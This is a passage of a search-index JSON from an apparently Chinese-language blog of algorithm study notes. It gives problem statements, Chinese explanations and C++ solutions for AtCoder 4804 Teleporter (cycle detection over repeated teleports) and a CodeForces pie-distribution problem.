727202214173249351 6 5 2 5 3 2 1.9. Sample Output 2 # 2 1.10. Source # AtCoder 4804 Teleporter 2. \u89e3\u8bfb # \u5c06\u6240\u6709\u8def\u5f84\u4f7f\u7528\u90bb\u63a5\u8868\u8fdb\u884c\u5b58\u50a8\uff0c\u7136\u540e\u5bf9\u8def\u5f84\u4f9d\u6b21\u8fdb\u884c\u904d\u5386\uff0c\u5c06\u904d\u5386\u8fc7\u7684\u8282\u70b9\u5b58\u50a8\u5728\u6808 Stack \u4e2d\uff0c\u627e\u51fa\u56fe\u4e2d\u7684\u73af\u8def\u3002 \u5728\u8282\u70b9\u5165\u6808\u524d\uff0c\u5224\u65ad\u5176\u662f\u5426\u5728\u6808\u4e2d\uff0c\u82e5\u5728\uff0c\u5219\u8be5\u8282\u70b9\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\u5230\u6808\u9876\u4f4d\u7f6e\u4e4b\u95f4\u7684\u8282\u70b9\u6240\u8fde\u6210\u7684\u8fb9\u5373\u4e3a\u6211\u4eec\u8981\u627e\u7684\u73af\u8def C \uff0c\u6c42\u51fa\u73af\u8def\u957f\u5ea6 S \u3002 \u5224\u65ad \u6e38\u8d70\u6b21\u6570 K \u662f\u5426\u5927\u4e8e\u56fe\u7684\u8d77\u70b9 Q_0 \u5230\u73af\u8def\u8d77\u70b9 W_0 \u7684\u8ddd\u79bb length = Q_0 - W_0 \u3002 \u82e5 K > length \uff0c\u5219\u8f93\u51fa Stack \u4e2d\u4ece 0 \u5f00\u59cb\u8ba1\u6570\u7b2c Q_0 + (K - W_0) \\% S \u4e2a\u5143\u7d20\u3002 \u82e5 K \\le length \uff0c\u5219\u8f93\u51fa Stack \u4e2d\u4ece 0 \u5f00\u59cb\u8ba1\u6570\u7b2c K \u4e2a\u5143\u7d20\u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> #include <vector> using namespace std; const int NUM = 2 * 10e5 + 1; // \u5b58\u50a8 long long list[NUM]; // \u6807\u5fd7\u8bbf\u95ee bool visit[NUM]; // \u6808\u5b58\u50a8\u8bbf\u95ee\u8def\u5f84 vector<long long> vec; int main() { // test case long long n, k; scanf(\"%lld %lld\", &n, &k); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); memset(visit, 0, sizeof(visit)); // \u8f93\u5165 for (long long i = 0; i < n; i++) { scanf(\"%lld\", &list[i]); } // \u521d\u59cb\u5316 long long buffer = 1; // \u8ba1\u7b97 for (int i = 0; i < n; i++) { // \u6807\u5fd7\u8bbf\u95ee visit[buffer] = 1; // \u8282\u70b9\u5165\u6808 vec.push_back(buffer); // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8282\u70b9 buffer = list[buffer - 1]; // \u82e5\u5f62\u6210\u73af\u8def if (visit[buffer] == 1) { break; } } // \u5728\u6808\u4e2d\u627e\u51fa\u73af\u8def\u5f00\u59cb\u4f4d\u7f6e auto it = find(vec.begin(), vec.end(), buffer); // \u73af\u8def\u957f\u5ea6 long long cycleLength = vec.end() - it; // \u73af\u8def\u5f00\u59cb\u524d\u7684\u6808\u6df1\u5ea6 long long stackLength = it - vec.begin(); // \u8ba1\u7b97\u4ece\u73af\u8def\u8d77\u70b9\u5f00\u59cb\u7684\u4f4d\u79fb long long posMark; if (k > stackLength) { // \u82e5\u5b58\u5728\u73af\u8def posMark = (k - stackLength) % cycleLength; } else { // \u82e5\u4e0d\u5b58\u5728\u73af\u8def posMark = (k - stackLength); } // \u8f93\u51fa printf(\"%lld\\n\", vec[stackLength + posMark]); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.AtCoder 4804 Teleporter"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#atcoder-4804-teleporter","text":"","title":"AtCoder 4804 Teleporter"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#_1","text":"AtCoder 4804 Teleporter \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Constraints 1.5. Output 1.6. Sample Input 1 1.7. Sample Output 1 1.8. Sample Input 2 1.9. Sample Output 2 1.10. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 1024 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#12-problem-description","text":"The Kingdom of Takahashi has N towns, numbered 1 through N . There is one teleporter in each town. The teleporter in Town i (1 \\leq i \\leq N) sends you to Town A_i . Takahashi, the king, loves the positive integer K . The selfish king wonders what town he will be in if he starts at Town 1 and uses a teleporter exactly K times from there. Help the king by writing a program that answers this question.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#13-input","text":"N K A_1\\ A_2\\ \\dots \\ A_N","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#14-constraints","text":"2 \\leq N \\leq 2 \\times 10^5 1 \\leq A_i \\leq N 1 \\leq K \\leq 10^{18}","title":"1.4. Constraints"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#15-output","text":"Print the integer representing the town the king will be in if he starts at Town 1 and uses a teleporter exactly K times from there.","title":"1.5. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#16-sample-input-1","text":"4 5 3 2 4 1","title":"1.6. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#17-sample-output-1","text":"4 If we start at Town 1 and use the teleporter 5 times, our travel will be as follows: 1 \\to 3 \\to 4 \\to 1 \\to 3 \\to 4 .","title":"1.7. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#18-sample-input-2","text":"6 727202214173249351 6 5 2 5 3 2","title":"1.8. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#19-sample-output-2","text":"2","title":"1.9. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#110-source","text":"AtCoder 4804 Teleporter","title":"1.10. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#2","text":"\u5c06\u6240\u6709\u8def\u5f84\u4f7f\u7528\u90bb\u63a5\u8868\u8fdb\u884c\u5b58\u50a8\uff0c\u7136\u540e\u5bf9\u8def\u5f84\u4f9d\u6b21\u8fdb\u884c\u904d\u5386\uff0c\u5c06\u904d\u5386\u8fc7\u7684\u8282\u70b9\u5b58\u50a8\u5728\u6808 Stack \u4e2d\uff0c\u627e\u51fa\u56fe\u4e2d\u7684\u73af\u8def\u3002 \u5728\u8282\u70b9\u5165\u6808\u524d\uff0c\u5224\u65ad\u5176\u662f\u5426\u5728\u6808\u4e2d\uff0c\u82e5\u5728\uff0c\u5219\u8be5\u8282\u70b9\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\u5230\u6808\u9876\u4f4d\u7f6e\u4e4b\u95f4\u7684\u8282\u70b9\u6240\u8fde\u6210\u7684\u8fb9\u5373\u4e3a\u6211\u4eec\u8981\u627e\u7684\u73af\u8def C \uff0c\u6c42\u51fa\u73af\u8def\u957f\u5ea6 S \u3002 \u5224\u65ad \u6e38\u8d70\u6b21\u6570 K \u662f\u5426\u5927\u4e8e\u56fe\u7684\u8d77\u70b9 Q_0 \u5230\u73af\u8def\u8d77\u70b9 W_0 \u7684\u8ddd\u79bb length = Q_0 - W_0 \u3002 \u82e5 K > length \uff0c\u5219\u8f93\u51fa Stack \u4e2d\u4ece 0 \u5f00\u59cb\u8ba1\u6570\u7b2c Q_0 + (K - W_0) \\% S \u4e2a\u5143\u7d20\u3002 \u82e5 K \\le length \uff0c\u5219\u8f93\u51fa Stack \u4e2d\u4ece 0 \u5f00\u59cb\u8ba1\u6570\u7b2c K \u4e2a\u5143\u7d20\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/#3","text":"#include <iostream> #include <string.h> #include <vector> using namespace std; const int NUM = 2 * 10e5 + 1; // \u5b58\u50a8 long long list[NUM]; // \u6807\u5fd7\u8bbf\u95ee bool visit[NUM]; // \u6808\u5b58\u50a8\u8bbf\u95ee\u8def\u5f84 vector<long long> vec; int main() { // test case long long n, k; scanf(\"%lld %lld\", &n, &k); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); memset(visit, 0, sizeof(visit)); // \u8f93\u5165 for (long long i = 0; i < n; i++) { scanf(\"%lld\", &list[i]); } // \u521d\u59cb\u5316 long long buffer = 1; // \u8ba1\u7b97 for (int i = 0; i < n; i++) { // \u6807\u5fd7\u8bbf\u95ee visit[buffer] = 1; // \u8282\u70b9\u5165\u6808 vec.push_back(buffer); // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8282\u70b9 buffer = list[buffer - 1]; // \u82e5\u5f62\u6210\u73af\u8def if (visit[buffer] == 1) { break; } } // \u5728\u6808\u4e2d\u627e\u51fa\u73af\u8def\u5f00\u59cb\u4f4d\u7f6e auto it = find(vec.begin(), vec.end(), buffer); // \u73af\u8def\u957f\u5ea6 long long cycleLength = vec.end() - it; // \u73af\u8def\u5f00\u59cb\u524d\u7684\u6808\u6df1\u5ea6 long long stackLength = it - vec.begin(); // \u8ba1\u7b97\u4ece\u73af\u8def\u8d77\u70b9\u5f00\u59cb\u7684\u4f4d\u79fb long long posMark; if (k > stackLength) { // \u82e5\u5b58\u5728\u73af\u8def posMark = (k - stackLength) % cycleLength; } else { // \u82e5\u4e0d\u5b58\u5728\u73af\u8def posMark = (k - stackLength); } // \u8f93\u51fa printf(\"%lld\\n\", vec[stackLength + posMark]); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/","text":"2020 Ateneo de Manila University DISCS PrO HS Division D. Riana and Distribution of Pie # \u76ee\u5f55 # 2020 Ateneo de Manila University DISCS PrO HS Division D. Riana and Distribution of Pie \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1 second Memory Limit: 256 megabytes 1.2. Problem Description # Riana baked a round pie in preparation for her birthday party. After baking the pie, she thought that it would be boring to simply give the pie evenly across everyone attending her party. After some thought, she came up with the idea of using the pie in a game for the party goers. In her game, each person attending the party will each take only one turn. One full turn goes like this: Person i begins his turn by choosing a percentage P_i\\% between 0-100. Person i then takes P_i\\% of the pie remaining. Person i ends his turn by taking P_i\\% of the slices of pie that have already been taken by everyone who went before person i . For example, if four people Mathil, Quin, Octavian, and Velyna attend the party: In the first turn, Mathil starts by choosing 30%. He then takes 30% of the remaining pie which has not been touched, meaning Mathil takes 30%. Mathil has 30% of the pie. The pie is now 70% of its original size. In the second turnn Quin chooses 20%. Quin then takes 20% of what's left of the pie, which is 14% of the pie's original size. Next, Quin takes 20% of Mathil's slice, which is 6% of the pie's original size. Mathil now only has 24% of the pie, while Quin has (14%+6%) 20% of the pie's original size. The pie is now 56% of its original size. In the third turn, Octavian comes in and chooses 10%. Octavian take 10% of the what's left of the pie, which is 5.6% of the pie's original size. He then takes 10% of Mathil's remaining 24% and Quin's 20% Mathil now only has 21.6% of the pie's original size. Quin now only has 18% of the pie's original size. Octavian has 10% of the pie's original size. The pie is now 50.4% of its original size. In the fourth and final turn, Velyna comes in and chooses 50%. Velyna takes 50% of the what's left of the pie, which is 25.2% of the pie's original size. She then takes 50% of Mathil's remaining 21.6%, Quin's remaining 18%, and Octavian's 10%. Mathil now only has 10.8% of the pie's original size. Quin now only has 9% of the pie's original size. Octavian now only has 5% of the pie's original size. Velyna has 50% of the pie's original size. The pie is now 25.2% of its original size. But wait! this is wrong! Riana's household has a strict 'no leftovers' policy, so she wants 100% of the pie to get eaten! Riana is also an advocate of equality, so she wants to distribute the pie slices such that the difference between the biggest slice and the smallest slice is minimized. However, Riana is also secretly lazy, so she enlisted the help of her friend, you! Help her figure out the optimal percentage each person should take. 1.3. Input # The input will contain one line containing a single integer N , the number of people going to the party. The value N is guaranteed to be between 1 and 10^{3} . 1.4. Output # Output contains N lines. The i th line of the output must contain the percentage of the pie which the i th person to take slices should take. (The first person's percentage should be on the first line, the second should be on the second line, the third should be on the third line, etc.) Answers will be accepted if they are within 10^{-4} away from the correct answer. 1.5. Sample Input # 1 1.6. Sample Output # 100.0000 1.7. Note # In the sample test case, since the first person is the only person in the party (quite sad), he takes the whole cake. This satisfies the two conditions that Riana wanted to satisfy: 100% of the cake is eaten. The difference between the Maximum and the Minimum is minimized. (The difference is 0.) 1.8. Source # CodeForces 102556 D. Riana and Distribution of Pie 2. \u89e3\u8bfb # \u9898\u610f \uff1a\u684c\u5b50\u4e0a\u6709\u4e00\u53ea\u70b8\u9e21\uff0c\u5b83\u7684\u521d\u59cb\u6bd4\u4f8b\u4e3a 100\\% \u3002 Person i \u5148\u5728 [0,100] \u4e2d\u9009\u62e9\u4e00\u4e2a\u6570\u5b57 P_i \uff0c\u6784\u6210\u6bd4\u4f8b P_i\\% \u3002 Person i \u518d\u62ff\u8d70\u684c\u5b50\u4e0a\u5269\u4e0b\u7684\u70b8\u9e21\u7684 P_i\\% \u3002 Person i \u6700\u540e\u975e\u5e38\u6b8b\u5fcd\u5730\u4f9d\u6b21\u4ece\u6bcf\u4e2a\u5728\u4ed6\u524d\u9762\u62ff\u70b8\u9e21\u7684\u4eba\u624b\u4e2d\u62ff\u8d70 P_i\\% \u4ed6\u4eec\u624b\u4e2d\u7684\u70b8\u9e21\u3002 \u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e8b\u4e86\u5417\uff1f\u8fd8\u6709\u4e24\u4e2a\u8981\u6c42 \u70b8\u9e21\u5fc5\u987b 100\\% \u5730\u88ab\u5206\u6389 \u5206\u5230\u6700\u591a\u7684\u4eba\u548c\u5206\u5230\u6700\u5c11\u7684\u4eba\u4ed6\u4eec\u624b\u4e2d\u70b8\u9e21\u6bd4\u4f8b\u7684\u5dee\u503c\u8981\u6700\u5c0f \u8f93\u51fa\u7684\u7ed3\u679c\u4e0e\u6807\u51c6\u7b54\u6848\u5dee\u503c\u4e0d\u8d85\u8fc7 10^{-4} \u5373\u4e3a\u6b63\u786e\u3002 \u9898\u89e3 \uff1a \u9996\u5148\u4ece\u70b8\u9e21\u5fc5\u987b 100\\% \u5730\u88ab\u5206\u6389\u8fd9\u4e2a\u6761\u4ef6\u6765\u8003\u8651\u3002\u5982\u679c\u6bcf\u4e2a\u4eba\u9009\u62e9\u7684\u6bd4\u4f8b P_i\\% \\in[0, 1) \uff0c\u90a3\u4e48\u70b8\u9e21\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u5206\u5b8c\uff0c\u6240\u4ee5\u80af\u5b9a\u8981\u6709\u4e00\u4e2a\u4eba\u7684 P_i\\% = 1 \uff0c\u5982\u679c\u8fd9\u4e2a\u4eba\u4e0d\u662f\u7b2c\u4e00\u4e2a\u4eba\uff0c\u5219\u4f1a\u628a\u524d\u9762\u7684\u4eba\u624b\u4e0a\u7684\u70b8\u9e21\u5168\u90e8\u62a2\u8d70\uff0c\u5b9e\u5728\u8fc7\u4e8e\u6b8b\u5fcd\uff0c\u4e5f\u4e0d\u6ee1\u8db3 \u8981\u6c422 \uff0c\u6240\u4ee5\u8ba9\u7b2c\u4e00\u4e2a\u4eba\u5148\u62ff\u8d70\u5168\u90e8\u7684\u70b8\u9e21\u3002 \u518d\u4ece \u8981\u6c422 \u6765\u8003\u8651\uff0c\u5168\u90e8\u5e73\u5206\u7684\u60c5\u51b5\u4e0b\uff0c\u5dee\u503c\u662f\u6700\u5c0f\u7684\uff0c\u90a3\u4e48\u8981\u600e\u4e48\u8fbe\u5230\u5e73\u5206\u7684\u6548\u679c\u5462\uff1f\u6211\u4eec\u5df2\u7ecf\u6709\u4e86 P_1\\% = 1 \uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u60f3\u5230\uff0c\u6700\u540e\u4e00\u4e2a\u4eba\u8981\u4ece\u524d\u9762\u7684\u6240\u6709\u4eba\u624b\u4e0a\u62ff\u70b8\u9e21\uff0c\u90a3\u4e48\u6700\u540e\u4ed6\u624b\u4e0a\u4e00\u5b9a\u4f1a\u6709 P_n\\% \u4e2a\u70b8\u9e21\u3002 \u6709\u4e86\u5bf9\u7b2c\u4e00\u4e2a\u4eba\u548c\u6700\u540e\u4e00\u4e2a\u4eba\u7684\u63a8\u65ad\uff0c\u90a3\u4e48\u8003\u8651\u53ea\u6709 2\u4e2a\u4eba \u7684\u60c5\u51b5\uff0c P_1\\% = 1 \uff0c P_2\\% = 0.5 \uff0c\u70b8\u9e21\u5c31\u88ab\u5e73\u5206\u4e86\u3002 \u518d\u8003\u8651 3\u4e2a\u4eba \u7684\u60c5\u51b5\uff0c3\u4e2a\u4eba\u8981\u5e73\u5206\u7684\u8bdd\uff0c\u6bcf\u4e2a\u4eba 1/3 \uff0c\u4e5f\u5c31\u662f P_3\\% = 1/3 \uff0c\u90a3\u4e48\u5176\u5b9e\u53ea\u8981\u524d\u9762 2\u4e2a\u4eba \u624b\u4e0a \u5404\u6709 0.5 \u53ea\u70b8\u9e21\uff0c\u6700\u540e\u70b8\u9e21\u5c31\u88ab\u5e73\u5206\u4e86\u3002 \u4e8e\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u65ad\uff0c\u7b2c i \u4e2a\u4eba\u7684\u5206\u914d\u6bd4\u4f8b\u4e3a P_i\\% = \\frac{1}{i} \u4fdd\u75595\u4f4d\u5c0f\u6570\u5373\u53ef\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { int n; cin >> n; for (int i = 1; i <= n; i++) { printf(\"%.5lf\\n\", (1.0 / i) * 100); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.CodeForces D Riana and Distribution of Pie"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#2020-ateneo-de-manila-university-discs-pro-hs-division-d-riana-and-distribution-of-pie","text":"","title":"2020 Ateneo de Manila University DISCS PrO HS Division D. Riana and Distribution of Pie"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#_1","text":"2020 Ateneo de Manila University DISCS PrO HS Division D. Riana and Distribution of Pie \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#11-limit","text":"Time Limit: 1 second Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#12-problem-description","text":"Riana baked a round pie in preparation for her birthday party. After baking the pie, she thought that it would be boring to simply give the pie evenly across everyone attending her party. After some thought, she came up with the idea of using the pie in a game for the party goers. In her game, each person attending the party will each take only one turn. One full turn goes like this: Person i begins his turn by choosing a percentage P_i\\% between 0-100. Person i then takes P_i\\% of the pie remaining. Person i ends his turn by taking P_i\\% of the slices of pie that have already been taken by everyone who went before person i . For example, if four people Mathil, Quin, Octavian, and Velyna attend the party: In the first turn, Mathil starts by choosing 30%. He then takes 30% of the remaining pie which has not been touched, meaning Mathil takes 30%. Mathil has 30% of the pie. The pie is now 70% of its original size. In the second turnn Quin chooses 20%. Quin then takes 20% of what's left of the pie, which is 14% of the pie's original size. Next, Quin takes 20% of Mathil's slice, which is 6% of the pie's original size. Mathil now only has 24% of the pie, while Quin has (14%+6%) 20% of the pie's original size. The pie is now 56% of its original size. In the third turn, Octavian comes in and chooses 10%. Octavian take 10% of the what's left of the pie, which is 5.6% of the pie's original size. He then takes 10% of Mathil's remaining 24% and Quin's 20% Mathil now only has 21.6% of the pie's original size. Quin now only has 18% of the pie's original size. Octavian has 10% of the pie's original size. The pie is now 50.4% of its original size. In the fourth and final turn, Velyna comes in and chooses 50%. Velyna takes 50% of the what's left of the pie, which is 25.2% of the pie's original size. She then takes 50% of Mathil's remaining 21.6%, Quin's remaining 18%, and Octavian's 10%. Mathil now only has 10.8% of the pie's original size. Quin now only has 9% of the pie's original size. Octavian now only has 5% of the pie's original size. Velyna has 50% of the pie's original size. The pie is now 25.2% of its original size. But wait! this is wrong! Riana's household has a strict 'no leftovers' policy, so she wants 100% of the pie to get eaten! Riana is also an advocate of equality, so she wants to distribute the pie slices such that the difference between the biggest slice and the smallest slice is minimized. However, Riana is also secretly lazy, so she enlisted the help of her friend, you! Help her figure out the optimal percentage each person should take.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#13-input","text":"The input will contain one line containing a single integer N , the number of people going to the party. The value N is guaranteed to be between 1 and 10^{3} .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#14-output","text":"Output contains N lines. The i th line of the output must contain the percentage of the pie which the i th person to take slices should take. (The first person's percentage should be on the first line, the second should be on the second line, the third should be on the third line, etc.) Answers will be accepted if they are within 10^{-4} away from the correct answer.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#15-sample-input","text":"1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#16-sample-output","text":"100.0000","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#17-note","text":"In the sample test case, since the first person is the only person in the party (quite sad), he takes the whole cake. This satisfies the two conditions that Riana wanted to satisfy: 100% of the cake is eaten. The difference between the Maximum and the Minimum is minimized. (The difference is 0.)","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#18-source","text":"CodeForces 102556 D. Riana and Distribution of Pie","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/2.CodeForces_D_Riana_and_Distribution_of_Pie/#2","text":"\u9898\u610f \uff1a\u684c\u5b50\u4e0a\u6709\u4e00\u53ea\u70b8\u9e21\uff0c\u5b83\u7684\u521d\u59cb\u6bd4\u4f8b\u4e3a 100\\% \u3002 Person i \u5148\u5728 [0,100] \u4e2d\u9009\u62e9\u4e00\u4e2a\u6570\u5b57 P_i \uff0c\u6784\u6210\u6bd4\u4f8b P_i\\% \u3002 Person i 